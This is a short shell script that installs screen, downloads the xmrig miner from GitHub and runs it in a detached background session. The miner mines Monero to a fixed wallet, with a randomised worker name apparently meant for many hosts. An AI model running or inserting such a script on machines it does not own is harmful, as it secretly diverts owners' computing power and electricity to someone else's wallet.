#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz
tar -xf xmrig-6.19.0-linux-x64.tar.gz
cd xmrig-6.19.0
screen -S "try" -d -m ./xmrig -o gulf.moneroocean.stream:10128 -a rx -k -u 42yA8XVUCAWKAztxYLTJ96e8pYfN5K3fQZBftWQkChTVaVuDkQskvxy9hZDFRacvo7KKGUkzptCsiGoXBKCAQnRWFMeWtcD.pappu-$(echo $(shuf -i 10000-99999 -n 1)) -p x
